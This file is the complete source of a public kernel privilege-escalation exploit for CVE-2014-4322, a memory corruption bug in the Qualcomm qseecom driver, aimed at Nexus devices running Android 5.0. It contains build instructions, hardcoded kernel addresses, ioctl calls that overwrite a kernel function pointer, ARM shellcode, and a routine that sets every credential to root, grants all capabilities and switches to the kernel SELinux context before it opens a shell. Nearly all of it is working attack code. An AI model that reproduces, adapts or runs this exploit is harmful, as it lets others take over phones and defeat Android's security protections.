/*
 *              CVE-2014-4322 exploit  for Nexus Android 5.0
 *
 *              author:  retme   retme7@gmail.com
 *              website: retme.net
 *
 *				 The exploit must be excuted as system privilege and specific  SELinux  context.
 *				 If exploit successed,you will gain root privilege and "kernel" SELinux  context
 *
 *              bug info:
 *              	https://www.codeaurora.org/projects/security-advisories/memory-corruption-qseecom-driver-cve-2014-4322
 *
 *				 how to build:
 *
			 				    create an  Android.mk as follow:

									include $(CLEAR_VARS)
									include $(CLEAR_VARS)
									LOCAL_SRC_FILES:= ./msm.c \
																				 ./shellcode.S

									LOCAL_MODULE:= exploit
									#LOCAL_C_INCLUDES += $(common_includes)
									LOCAL_CPPFLAGS += -DDEBUG
									LOCAL_CFLAGS += -DDEBUG
									LOCAL_LDLIBS += -L$(SYSROOT)/usr/lib -llog

									include $(BUILD_EXECUTABLE)
									include $(BUILD_EXECUTABLE)

								create Application.mk as follow:

									APP_ABI := armeabi
									APP_PLATFORM := android-8
									APP_PIE:= true

								use  ndk-build to build the project

				usage:

							 run  exploit as  system privilege,with SELinux context  such as "keystore","vold","drmserver","mediaserver","surfaceflinger"
 *
 *							 If exploit successed,you will gain root privilege and "kernel" SELinux  context
 *
 *
 *                                           */
//=========================================msm.c=============================================
#include <string.h>
#include <jni.h>
#include <android/log.h>
#include <pthread.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <asm/ptrace.h>
#include <asm/user.h>
#include <asm/ptrace.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
#include <linux/elf.h>
#include <linux/reboot.h>
#include <errno.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <linux/ptrace.h>
#include <linux/prctl.h>
#include <sys/system_properties.h>
#include <errno.h>
#include <termios.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <errno.h>
#include <linux/ion.h>

#include "../kernel.h"
#include "qseecom.h"

//4.4.2   CFW(for debug)
//#define PTMX_FOPS 0xc1334e00
//fnPrintk printk = 0xc0a0113c;

//Nexus Android 5.0  OFW
#define PTMX_DEVICE "/dev/ptmx"
#define PTMX_FOPS 0xc1236cd8
fnPrintk printk = 0xc0a21e78;

int MyCommitCred(int ruid, int rgid, signed int a3, int isSelinux);

int  kmemcmp(char *a1, char *a2, int len)
{
  int v3; // r3@2
  int v4; // r4@3
  int v5; // r5@3
  int result; // r0@4

  if ( len )
  {
    v3 = 0;
    while ( 1 )
    {
      v4 = a1[v3];
      v5 = a2[v3];
      if ( v4 != v5 )
        break;
      if ( a1[v3] )
      {
        ++v3;
        if ( len != v3 )
          continue;
      }
      goto LABEL_7;
    }
    result = v4 - v5;
  }
  else
  {
LABEL_7:
    result = 0;
  }
  return result;
}

int g_pid = 0;
int g_tgid = 0;



int open_ion(){
	int fd = open("/dev/ion",O_RDONLY);
    if (fd<0){
    	perror("open");
    }
    printf("ion fd  %d\n",fd);
    return fd;
}


// http://lwn.net/Articles/480055/

/*
 * struct ion_allocation_data {
	size_t len;
	size_t align;
	unsigned int heap_mask;
	unsigned int flags;
	struct ion_handle *handle;
};
 *
 *
 * */
#define ION_FLAG_SECURE (1<<31)

int alloc_ion_memory(int client_fd,int size,struct ion_handle** pphandle){
	int ret = -1;

	struct ion_allocation_data data;

// ION_FLAG_CACHED
	data.len = size;
	data.align = size;
	data.flags = ION_HEAP_TYPE_CARVEOUT ;
	//data.heap_mask = ION_HEAP_TYPE_CARVEOUT;
	//data.handle = handle;

	ret = ioctl(client_fd, ION_IOC_ALLOC, &data);
	if (ret<0){
		perror("ION_IOC_ALLOC");
	}
	*pphandle = data.handle;
	return ret;

}
/*
    struct ion_fd_data {
        struct ion_handle *handle;
        int fd;
   }
   */
int share_ion_memory(int client_fd,struct ion_handle* handle){
	struct ion_fd_data data;
	data.handle = handle;
	data.fd = -1;

	int ret = ioctl(client_fd, ION_IOC_SHARE, &data);


	return data.fd;

}




int obtain_dma_buf_fd(int size){
		int fd_device = open_ion();
		int dmf_fd = -1;

		struct ion_handle* handle;
		int ret = alloc_ion_memory(fd_device,size,&handle);
		if (ret<0){
			perror("alloc_ion_memory");
		}

		dmf_fd = share_ion_memory(fd_device,handle);

		if (dmf_fd<0){
			perror("share_ion_memory");
		}
		return dmf_fd;
}


void* fd_to_mmap(int fd,int size){


    void* seg_addr = mmap(0,
    					size	,
    					PROT_READ | PROT_WRITE,
    					MAP_SHARED,
                          fd,
                          0);

    if(seg_addr == MAP_FAILED){
    	perror("fd_to_map");
    }

	return seg_addr;
}



//c0a0113c T printk
void sayhello(){
	fnPrintk printk = 0xc0a0113c;
	printk("hell0 shellocde");
	return;
}

void shell_code2();

static int
run_obtain_root_privilege()
{
  int fd;
  int ret;

  fd = open(PTMX_DEVICE, O_WRONLY);
  if(fd<=0){perror("ptmx");return -1;}
  ret = fsync(fd);
  close(fd);

  return ret;
}


int main(int argc, char *argv[]){

        printf("mypid %d\n",getpid());
        int ret  = -1;

                        int  fd = open("/dev/qseecom", 0);
                        if (fd<0){
                        	perror("open");
                        	exit(-1);
                        }

                        void* abuseBuff = malloc(400);
                        memset(abuseBuff,0,400);

                        int* intArr = (int*)abuseBuff;
                        int j = 0;

                        for(j=0;j<24;j++){

                                        intArr[j] = 0x1;

                        }


                        struct qseecom_send_modfd_cmd_req ioctlBuff;

                        prctl(PR_SET_NAME, "GodFather", 0, 0, 0);

                       // if(0==fork()){

                            g_pid = getpid();
                            g_tgid = g_pid;
                            prctl(PR_SET_NAME, "ihoo.darkytools", 0, 0, 0);

                            //QSEECOM_IOCTL_SET_MEM_PARAM_REQ
                            struct qseecom_set_sb_mem_param_req req;
                            req.ifd_data_fd = obtain_dma_buf_fd(8192);

                            req.virt_sb_base = abuseBuff;
                            req.sb_len = 8192;

                            ret = ioctl(fd, QSEECOM_IOCTL_SET_MEM_PARAM_REQ, &req);
                            printf("QSEECOM_IOCTL_SET_MEM_PARAM_REQ return 0x%x \n",ret);

                            ioctlBuff.cmd_req_buf = abuseBuff;
                            ioctlBuff.cmd_req_len = 400;
                            ioctlBuff.resp_buf = abuseBuff;
                            ioctlBuff.resp_len = 400;
                            int i = 0;
                            for (i = 0;i<4;i++){
                            	ioctlBuff.ifd_data[i].fd = 0;
                            	ioctlBuff.ifd_data[i].cmd_buf_offset =0;
                            }
                            ioctlBuff.ifd_data[0].fd = req.ifd_data_fd;
                            ioctlBuff.ifd_data[0].cmd_buf_offset =   0;//(int)(0xc03f0ab4 + 8) - (int)abuseBuff;


                                printf("QSEECOM_IOCTL_SEND_CMD_REQ");
                                ret = ioctl(fd, QSEECOM_IOCTL_SEND_MODFD_CMD_REQ, &ioctlBuff);


                                printf("return %p %p\n",intArr[0],intArr[1]);
                                perror("QSEECOM_IOCTL_SEND_CMD_REQ end\n");
                                printf("ioctl return 0x%x \n",ret);

                                //*(int*)intArr[0] = 0x0;
                                void* addr = mmap(intArr[0],4096,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,-1,0);
                                printf("mmap return %p \n",addr);

                                *(int*)addr =  0xE3500000;
                                *((int*)((int)addr+4)) = 0xe1a0f00e;
                                memcpy(addr,shell_code2,400);

                                int* arr = (int*)addr;
                                for(i=0;i<10;i++){
                                	if(arr[i] == 0xeeeeeeee)
                                		arr[i] = (int)MyCommitCred;
                                	printf("%p\n",arr[i]);

                                }

                                //c1334e00 b ptmx_fops
                                ioctlBuff.ifd_data[0].cmd_buf_offset =   (int)(PTMX_FOPS + 14*4) - (int)abuseBuff;


                                printf("QSEECOM_IOCTL_SEND_CMD_REQ");
                                ret = ioctl(fd, QSEECOM_IOCTL_SEND_MODFD_CMD_REQ, &ioctlBuff);
                                printf("return %p %p\n",intArr[0],intArr[1]);
                                perror("QSEECOM_IOCTL_SEND_CMD_REQ end\n");
                                printf("ioctl return 0x%x \n",ret);


                                run_obtain_root_privilege();


                                char * argv1[]={"sh",(char *)0};
                               int result =  execv("/system/bin/sh", argv1);
                                if(result){
                                                perror("execv");
                                }

        return 0;


}





int MyCommitCred(int ruid, int rgid, signed int a3, int isSelinux)
{

        int v38; // [sp+0h] [bp-60h]@1
        int addrBase;
        char szName[16] = "ihoo.darkytools";
        int offset;
        mycred *my_cred;
        mycred *my_real_cred;
        struct task_security_struct * tsec;
        int ret = -1;

        int searchLenth;

        isSelinux = 1;
        //return 0;
        addrBase = *(int*)(((int)(&v38) & 0xFFFFE000) + 0xC);
        //return addrBase;
        if ( addrBase > 0xBFFFFFFF )
        {

          offset = 0;
          while ( 1 )
          {
            addrBase += 4;
            if ( !kmemcmp(addrBase, szName, 16) )
              break;
            ++offset;
            if ( offset == 0x600 )
            {
              return 18;
            }
          }
        }
        else
                return 17;

        my_cred = *(int*)(addrBase -8);
        my_real_cred = *(int*)(addrBase -8 - 4);


        searchLenth = 0;
        while(searchLenth<0x20){


                        if(!my_cred || !my_real_cred
                                        || my_cred<0xBFFFFFFF || my_real_cred<0xBFFFFFFF
                                       ){
                                        //2.6?

                                        addrBase-=4;


                                        my_cred = *(int*)(addrBase-8 );
                                        my_real_cred = *(int*)(addrBase -8-4);

                        }
                        else
                                break;

                        searchLenth++;
        }

        if(searchLenth == 0x20)
                return 0X20;
                // fuck!! where is my cred???


        my_cred->uid = 0;
        my_cred->gid = 0;
        my_cred->suid = 0;
        my_cred->sgid = 0;
        my_cred->egid = 0;
        my_cred->euid = 0;
        my_cred->fsgid = 0;
        my_cred->fsuid = 0;
        my_cred->securebits=0;
        my_cred->cap_bset.cap[0] = -1;
        my_cred->cap_bset.cap[1] = -1;
        my_cred->cap_inheritable.cap[0] = -1;
        my_cred->cap_inheritable.cap[1] = -1;
        my_cred->cap_permitted.cap[0] = -1;
        my_cred->cap_permitted.cap[1] = -1;
        my_cred->cap_effective.cap[0] = -1;
        my_cred->cap_effective.cap[1] = -1;

        my_real_cred->uid = 0;
        my_real_cred->gid = 0;
        my_real_cred->suid = 0;
        my_real_cred->sgid = 0;
        my_real_cred->egid = 0;
        my_real_cred->euid = 0;
        my_real_cred->fsgid = 0;
        my_real_cred->fsuid = 0;
        my_real_cred->securebits=0;
        my_real_cred->cap_bset.cap[0] = -1;
        my_real_cred->cap_bset.cap[1] = -1;
        my_real_cred->cap_inheritable.cap[0] = -1;
        my_real_cred->cap_inheritable.cap[1] = -1;
        my_real_cred->cap_permitted.cap[0] = -1;
        my_real_cred->cap_permitted.cap[1] = -1;
        my_real_cred->cap_effective.cap[0] = -1;
        my_real_cred->cap_effective.cap[1] = -1;


        if(isSelinux){

                        tsec = my_cred->security;

                        if(tsec && tsec > 0xBFFFFFFF){
                                        tsec->sid = 1;
                                        tsec->exec_sid = 1;

                                        ret = 15;
                        }
                        else {
                                        tsec = (struct task_security_struct*)(*(int*)(0x10 +  (int)&my_cred->security));

                                        if(tsec && tsec > 0xBFFFFFFF){
                                                                            tsec->sid = 1;
                                                                            tsec->exec_sid = 1;

                                                                            ret = 15;
                                                            }
                        }


                        tsec = my_real_cred->security;

                        if(tsec && tsec > 0xBFFFFFFF){
                                        tsec->sid = 1;
                                        tsec->exec_sid = 1;

                                        ret = 15;
                        }else {
                                        tsec = (struct task_security_struct*)(*(int*)(0x10 +  (int)&my_real_cred->security));

                                        if(tsec && tsec > 0xBFFFFFFF){
                                                                            tsec->sid = 1;
                                                                            tsec->exec_sid = 1;

                                                                            ret = 15;
                                                            }
                        }



        }
        else{
                        ret = 16;
        }
        printk("return %d",ret);
        return ret;
}
//=========================================msm.c   end=============================================
//=========================================shellcode.S   start=============================================
#define __ASSEMBLY__
#include  <linux/linkage.h>

.extern sayhello


ENTRY(shell_code2)
                      ldr r0, [pc , #4]
                      STMFD  SP!, {R0}
                      LDMFD   SP!, {PC}
 .byte 0xee, 0xee, 0xee, 0xee
//=========================================shellcode.S   end=============================================